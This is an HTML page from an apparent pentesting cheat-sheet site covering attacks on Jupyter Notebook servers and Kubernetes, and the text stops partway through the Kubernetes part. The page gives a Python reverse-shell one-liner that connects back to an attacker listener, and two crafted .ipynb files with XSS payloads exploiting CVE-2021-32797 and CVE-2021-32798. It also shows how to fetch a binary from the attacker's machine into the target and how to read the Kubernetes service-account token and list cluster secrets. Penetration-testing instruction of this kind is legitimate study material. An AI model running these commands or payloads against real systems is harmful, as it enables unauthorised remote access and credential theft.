<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Jupyter Notebook Pentesting - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Jupyter Notebook Pentesting", url: "#_top", children: [
              {title: "Run Notebook Server Locally", url: "#run-notebook-server-locally" },
              {title: "Authorization with Token", url: "#authorization-with-token" },
              {title: "Common Directories", url: "#common-directories" },
              {title: "Remote Code Execution (RCE)", url: "#remote-code-execution-rce" },
              {title: ".ipynb RCE (CVE-2021-32797, CVE-2021-32798)", url: "#ipynb-rce-cve-2021-32797-cve-2021-32798" },
          ]},
          {title: "Kubernetes Pentesting", url: "#kubernetes-pentesting", children: [
              {title: "Check if the Kubectl Command Available in Target Machine", url: "#check-if-the-kubectl-command-available-in-target-machine" },
              {title: "Investigation From Inside", url: "#investigation-from-inside" },
              {title: "Investigation via Kubernetes API Server", url: "#investigation-via-kubernetes-api-server" },
              {title: "Privilege Escalation (Escape) using the Container Image", url: "#privilege-escalation-escape-using-the-container-image" },
              {title: "Privilege Escalation using Bad Pods", url: "#privilege-escalation-using-bad-pods" },
          ]},
          {title: "MicroK8s Pentesting", url: "#microk8s-pentesting", children: [
              {title: "Ports and Services", url: "#ports-and-services" },
              {title: "Docker Registry (port 32000)", url: "#docker-registry-port-32000" },
              {title: "Investigation from Inside", url: "#investigation-from-inside_1" },
              {title: "Privilege Escalation (CVE-2019-15789) \u2264 1.15.2", url: "#privilege-escalation-cve-2019-15789-1152" },
          ]},
          {title: "Orange Data Mining", url: "#orange-data-mining", children: [
              {title: "Installation \u0026amp; Start", url: "#installation-start" },
              {title: "Basic Usage", url: "#basic-usage" },
          ]},
          {title: "VirtualBox Settings for NAT Network \u0026amp; Port Forwarding", url: "#virtualbox-settings-for-nat-network-port-forwarding", children: [
              {title: "1. Creat a New Network", url: "#1-creat-a-new-network" },
              {title: "2. Set the Network to Each Guest OS Network", url: "#2-set-the-network-to-each-guest-os-network" },
              {title: "3. Set Static IP Address in Guest OS", url: "#3-set-static-ip-address-in-guest-os" },
              {title: "4. Connect From Host to Guest", url: "#4-connect-from-host-to-guest" },
              {title: "5. Connect From Guest to Host", url: "#5-connect-from-guest-to-host" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="jupyter-notebook-pentesting">Jupyter Notebook Pentesting</h1>
<p>Jupyter notebook is a web-based interactive computing platform. It’s often used for machine learning, data science, etc. It runs locally at 127.0.0.1:8888 by default.</p>
<h2 id="run-notebook-server-locally">Run Notebook Server Locally</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a># For Jupyterlab (more advanced than notebook)
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>pip install jupyterlab
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>jupyter-lab
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a># Specify the token
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>jupyter-lab --NotebookApp.token=abcdef...
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a># For Notebook (classic)
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>pip install notebook
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>jupyter notebook
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a># Specify the token
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>jupyter notebook --NotebookApp.token=abcdef...
</span></code></pre></div>
<p>After that, we can access to <code>http://127.0.0.1:8888/</code> in browser.</p>
<h2 id="authorization-with-token">Authorization with Token</h2>
<p>Reference: <a href="https://jupyter-notebook.readthedocs.io/en/stable/security.html">https://jupyter-notebook.readthedocs.io/en/stable/security.html</a></p>
<p>If we have the token for Jupyter notebook server, we can authorize it by adding the token in the “Authorization” HTTP header.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Authorization: token abcdef...
</span></code></pre></div>
<p>Or we can also add the token to URL parameter.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>https://my-notebook/tree/?token=abcdef...
</span></code></pre></div>
<p>Or directly input the login form.</p>
<h2 id="common-directories">Common Directories</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>/api/kernelspecs
</span></code></pre></div>
<h2 id="remote-code-execution-rce">Remote Code Execution (RCE)</h2>
<p>If the target machine opens the Jupyter notebook server then we can access to it from outside, we can simply execute arbitrary Python script in notebook. In short, we can get a shell by reverse shell!  <br />
First off, start a listener in local machine.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nc -lvnp 4444
</span></code></pre></div>
<p>After that, open some <strong><code>.ipynb</code></strong> file in Jupyter notebook top page, then input the following script and run.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>import socket,os,pty;s=socket.socket();s.connect((&quot;10.0.0.1&quot;, 4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)
</span></code></pre></div>
<p>We should get a shell in local terminal.</p>
<h2 id="ipynb-rce-cve-2021-32797-cve-2021-32798">.ipynb RCE (<strong>CVE-2021-32797, CVE-2021-32798)</strong></h2>
<p>Reference: <a href="https://github.com/google/security-research/security/advisories/GHSA-c469-p3jp-2vhx">https://github.com/google/security-research/security/advisories/GHSA-c469-p3jp-2vhx</a></p>
<p>We can inject arbitrary code in <code>.ipynb</code> file. Create the following file e.g. “exploit.ipynb” then upload it to Jupyter Notebook directory.</p>
<ul>
<li><strong>Jupyter Notebook</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>{
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a> &quot;cells&quot;: [
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>  {
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>   &quot;cell_type&quot;: &quot;code&quot;,
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>   &quot;execution_count&quot;: 0,
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>   &quot;metadata&quot;: {},
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>   &quot;outputs&quot;: [
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>    {
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>     &quot;data&quot;: {
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>      &quot;text/html&quot;: [
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>       &quot;&lt;select&gt;&lt;iframe&gt;&lt;/select&gt;&lt;img src=x: onerror=alert(&#39;xss&#39;)&gt;\n&quot;],
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>      &quot;text/plain&quot;: []
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>     },
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>     &quot;metadata&quot;: {},
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>     &quot;output_type&quot;: &quot;display_data&quot;
</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>    }
</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>   ],
</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>   &quot;source&quot;: [
</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>    &quot;&quot;
</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>   ]
</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>  }
</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a> ],
</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a> &quot;metadata&quot;: {
</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>  &quot;kernelspec&quot;: {
</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a>   &quot;display_name&quot;: &quot;Python 3&quot;,
</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a>   &quot;language&quot;: &quot;python&quot;,
</span><span id="__span-6-27"><a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>   &quot;name&quot;: &quot;python3&quot;
</span><span id="__span-6-28"><a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a>  },
</span><span id="__span-6-29"><a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a>  &quot;language_info&quot;: {
</span><span id="__span-6-30"><a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>   &quot;codemirror_mode&quot;: {
</span><span id="__span-6-31"><a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a>    &quot;name&quot;: &quot;ipython&quot;,
</span><span id="__span-6-32"><a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a>    &quot;version&quot;: 3
</span><span id="__span-6-33"><a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a>   },
</span><span id="__span-6-34"><a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a>   &quot;file_extension&quot;: &quot;.py&quot;,
</span><span id="__span-6-35"><a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a>   &quot;mimetype&quot;: &quot;text/x-python&quot;,
</span><span id="__span-6-36"><a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a>   &quot;name&quot;: &quot;python&quot;,
</span><span id="__span-6-37"><a id="__codelineno-6-37" name="__codelineno-6-37" href="#__codelineno-6-37"></a>   &quot;nbconvert_exporter&quot;: &quot;python&quot;,
</span><span id="__span-6-38"><a id="__codelineno-6-38" name="__codelineno-6-38" href="#__codelineno-6-38"></a>   &quot;pygments_lexer&quot;: &quot;ipython3&quot;,
</span><span id="__span-6-39"><a id="__codelineno-6-39" name="__codelineno-6-39" href="#__codelineno-6-39"></a>   &quot;version&quot;: &quot;3.9.6&quot;
</span><span id="__span-6-40"><a id="__codelineno-6-40" name="__codelineno-6-40" href="#__codelineno-6-40"></a>  }
</span><span id="__span-6-41"><a id="__codelineno-6-41" name="__codelineno-6-41" href="#__codelineno-6-41"></a> },
</span><span id="__span-6-42"><a id="__codelineno-6-42" name="__codelineno-6-42" href="#__codelineno-6-42"></a> &quot;nbformat&quot;: 4,
</span><span id="__span-6-43"><a id="__codelineno-6-43" name="__codelineno-6-43" href="#__codelineno-6-43"></a> &quot;nbformat_minor&quot;: 5
</span><span id="__span-6-44"><a id="__codelineno-6-44" name="__codelineno-6-44" href="#__codelineno-6-44"></a>}
</span></code></pre></div>
<ul>
<li><strong>Jupyter Lab</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>{
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a> &quot;cells&quot;: [
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>  {
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>   &quot;cell_type&quot;: &quot;markdown&quot;,
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>   &quot;metadata&quot;: {},
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>   &quot;source&quot;: [
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>    &quot;&lt;label for=buttonid style=\&quot;cursor: text\&quot;&gt;not safe to click here&lt;/label&gt;\n&quot;
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>   ]
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>  },
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>  {
</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>   &quot;cell_type&quot;: &quot;markdown&quot;,
</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>   &quot;metadata&quot;: {
</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>    &quot;highlighter&quot;: &quot;codemirror&quot;
</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>   },
</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>   &quot;source&quot;: &quot;&lt;div class=\&quot;jp-InputArea-editor\&quot;&gt;&lt;div class=\&quot;CodeMirror cm-s-jupyter\&quot;&gt;&lt;div class=\&quot;CodeMirror-scroll\&quot;&gt;&lt;div class=\&quot;CodeMirror-sizer\&quot;&gt;&lt;div style=\&quot;top:0px; position:relative\&quot;&gt;&lt;div class=\&quot;CodeMirror-lines\&quot;&gt;&lt;div style=\&quot;outline:none; position:relative\&quot;&gt;&lt;div class=\&quot;CodeMirror-code\&quot;&gt;&lt;div style=\&quot;position: relative\&quot;&gt;&lt;label for=buttonid style=\&quot;cursor: text\&quot;&gt;&lt;pre class=\&quot;CodeMirror-line\&quot; style=\&quot;background:transparent\&quot;&gt;&lt;span style=\&quot;padding-right: 0.1px\&quot;&gt;&lt;span class=\&quot;cm-builtin\&quot;&gt;print&lt;/span&gt;(&lt;span class=\&quot;cm-string\&quot;&gt;&amp;quot;Also not safe to click here&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/label&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&quot;
</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>  },
</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>  {
</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>   &quot;cell_type&quot;: &quot;code&quot;,
</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a>   &quot;execution_count&quot;: 0,
</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a>   &quot;metadata&quot;: {
</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a>    &quot;xrender&quot;: true
</span><span id="__span-7-22"><a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a>   },
</span><span id="__span-7-23"><a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a>   &quot;outputs&quot;: [
</span><span id="__span-7-24"><a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a>    {
</span><span id="__span-7-25"><a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a>     &quot;data&quot;: {
</span><span id="__span-7-26"><a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a>      &quot;text/html&quot;: [
</span><span id="__span-7-27"><a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a>       &quot;&lt;form id=jp-mk-edit action=&#39;javascript:alert(1)&#39; style=&#39;display:none&#39;&gt;&lt;button type=submit id=buttonid&gt;&lt;/form&gt;\n&quot;
</span><span id="__span-7-28"><a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a>      ],
</span><span id="__span-7-29"><a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a>      &quot;text/plain&quot;: []
</span><span id="__span-7-30"><a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a>     },
</span><span id="__span-7-31"><a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a>     &quot;metadata&quot;: {},
</span><span id="__span-7-32"><a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a>     &quot;output_type&quot;: &quot;display_data&quot;
</span><span id="__span-7-33"><a id="__codelineno-7-33" name="__codelineno-7-33" href="#__codelineno-7-33"></a>    }
</span><span id="__span-7-34"><a id="__codelineno-7-34" name="__codelineno-7-34" href="#__codelineno-7-34"></a>   ],
</span><span id="__span-7-35"><a id="__codelineno-7-35" name="__codelineno-7-35" href="#__codelineno-7-35"></a>   &quot;source&quot;: &quot;&quot;
</span><span id="__span-7-36"><a id="__codelineno-7-36" name="__codelineno-7-36" href="#__codelineno-7-36"></a>  }
</span><span id="__span-7-37"><a id="__codelineno-7-37" name="__codelineno-7-37" href="#__codelineno-7-37"></a> ],
</span><span id="__span-7-38"><a id="__codelineno-7-38" name="__codelineno-7-38" href="#__codelineno-7-38"></a> &quot;metadata&quot;: {
</span><span id="__span-7-39"><a id="__codelineno-7-39" name="__codelineno-7-39" href="#__codelineno-7-39"></a>  &quot;kernelspec&quot;: {
</span><span id="__span-7-40"><a id="__codelineno-7-40" name="__codelineno-7-40" href="#__codelineno-7-40"></a>   &quot;display_name&quot;: &quot;Python 3&quot;,
</span><span id="__span-7-41"><a id="__codelineno-7-41" name="__codelineno-7-41" href="#__codelineno-7-41"></a>   &quot;language&quot;: &quot;python&quot;,
</span><span id="__span-7-42"><a id="__codelineno-7-42" name="__codelineno-7-42" href="#__codelineno-7-42"></a>   &quot;name&quot;: &quot;python3&quot;
</span><span id="__span-7-43"><a id="__codelineno-7-43" name="__codelineno-7-43" href="#__codelineno-7-43"></a>  },
</span><span id="__span-7-44"><a id="__codelineno-7-44" name="__codelineno-7-44" href="#__codelineno-7-44"></a>  &quot;language_info&quot;: {
</span><span id="__span-7-45"><a id="__codelineno-7-45" name="__codelineno-7-45" href="#__codelineno-7-45"></a>   &quot;codemirror_mode&quot;: {
</span><span id="__span-7-46"><a id="__codelineno-7-46" name="__codelineno-7-46" href="#__codelineno-7-46"></a>    &quot;name&quot;: &quot;ipython&quot;,
</span><span id="__span-7-47"><a id="__codelineno-7-47" name="__codelineno-7-47" href="#__codelineno-7-47"></a>    &quot;version&quot;: 3
</span><span id="__span-7-48"><a id="__codelineno-7-48" name="__codelineno-7-48" href="#__codelineno-7-48"></a>   },
</span><span id="__span-7-49"><a id="__codelineno-7-49" name="__codelineno-7-49" href="#__codelineno-7-49"></a>   &quot;file_extension&quot;: &quot;.py&quot;,
</span><span id="__span-7-50"><a id="__codelineno-7-50" name="__codelineno-7-50" href="#__codelineno-7-50"></a>   &quot;mimetype&quot;: &quot;text/x-python&quot;,
</span><span id="__span-7-51"><a id="__codelineno-7-51" name="__codelineno-7-51" href="#__codelineno-7-51"></a>   &quot;name&quot;: &quot;python&quot;,
</span><span id="__span-7-52"><a id="__codelineno-7-52" name="__codelineno-7-52" href="#__codelineno-7-52"></a>   &quot;nbconvert_exporter&quot;: &quot;python&quot;,
</span><span id="__span-7-53"><a id="__codelineno-7-53" name="__codelineno-7-53" href="#__codelineno-7-53"></a>   &quot;pygments_lexer&quot;: &quot;ipython3&quot;,
</span><span id="__span-7-54"><a id="__codelineno-7-54" name="__codelineno-7-54" href="#__codelineno-7-54"></a>   &quot;version&quot;: &quot;3.9.6&quot;
</span><span id="__span-7-55"><a id="__codelineno-7-55" name="__codelineno-7-55" href="#__codelineno-7-55"></a>  }
</span><span id="__span-7-56"><a id="__codelineno-7-56" name="__codelineno-7-56" href="#__codelineno-7-56"></a> },
</span><span id="__span-7-57"><a id="__codelineno-7-57" name="__codelineno-7-57" href="#__codelineno-7-57"></a> &quot;nbformat&quot;: 4,
</span><span id="__span-7-58"><a id="__codelineno-7-58" name="__codelineno-7-58" href="#__codelineno-7-58"></a> &quot;nbformat_minor&quot;: 5
</span><span id="__span-7-59"><a id="__codelineno-7-59" name="__codelineno-7-59" href="#__codelineno-7-59"></a>}
</span></code></pre></div>
<h1 id="kubernetes-pentesting">Kubernetes Pentesting</h1>
<p>A portable, extensible, open source platform for managing containerized workloads and services, that facilitates both declarative configuration and automation. Default ports are 6443, 8443.</p>
<h2 id="check-if-the-kubectl-command-available-in-target-machine">Check if the Kubectl Command Available in Target Machine</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>kubectl -h
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>k0s -h
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>k0s kubectl -h
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>microk8s kubectl -h
</span></code></pre></div>
<p>If we cannot find kubectl, upload the binary from local machine.<br />
First off, install the kubectl in local machine.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>curl -LO &quot;https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl&quot;
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>python3 -m http.server
</span></code></pre></div>
<p>Then download the binary file into remote machine.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>wget http://&lt;local-ip&gt;:8000/kubectl -O /tmp/kubectl
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>chmod +x /tmp/kubectl
</span></code></pre></div>
<h2 id="investigation-from-inside">Investigation From Inside</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a># Get JWT
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>cat /var/run/secrets/kubernetes.io/serviceaccount/token
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a># if we find the token, decode it in https://jwt.io/
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a># Sensitive information in the directory
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>ls -a /var/lib/k0s/containerd/
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a># Check your permission
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>kubectl auth can-i --list
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a># /var/run/secrets/kubernetes.io/serviceaccount/token
</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>kubectl auth can-i --list --token=&lt;JWT&gt;
</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>
</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a># All information
</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>kubectl get all
</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>
</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a># Pods
</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a>kubectl get pods
</span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a># -A: List all pods across all namespaces
</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a>kubectl get pods -A
</span><span id="__span-11-20"><a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a># Get the detail information abou the pod
</span><span id="__span-11-21"><a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a># -o: Output format
</span><span id="__span-11-22"><a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a>kubectl get pod &lt;pod-name&gt; -o yaml
</span><span id="__span-11-23"><a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a># Specify the namespace
</span><span id="__span-11-24"><a id="__codelineno-11-24" name="__codelineno-11-24" href="#__codelineno-11-24"></a>kubectl get pod &lt;pod-name&gt; -n &lt;namespace&gt; -o yaml
</span><span id="__span-11-25"><a id="__codelineno-11-25" name="__codelineno-11-25" href="#__codelineno-11-25"></a>
</span><span id="__span-11-26"><a id="__codelineno-11-26" name="__codelineno-11-26" href="#__codelineno-11-26"></a># Jobs
</span><span id="__span-11-27"><a id="__codelineno-11-27" name="__codelineno-11-27" href="#__codelineno-11-27"></a>kubectl get job -n &lt;namespace&gt;
</span><span id="__span-11-28"><a id="__codelineno-11-28" name="__codelineno-11-28" href="#__codelineno-11-28"></a># -o: Output details
</span><span id="__span-11-29"><a id="__codelineno-11-29" name="__codelineno-11-29" href="#__codelineno-11-29"></a>kubectl get job -n &lt;namespace&gt; -o json
</span><span id="__span-11-30"><a id="__codelineno-11-30" name="__codelineno-11-30" href="#__codelineno-11-30"></a>
</span><span id="__span-11-31"><a id="__codelineno-11-31" name="__codelineno-11-31" href="#__codelineno-11-31"></a># Secrets
</span><span id="__span-11-32"><a id="__codelineno-11-32" name="__codelineno-11-32" href="#__codelineno-11-32"></a>kubectl get secrets
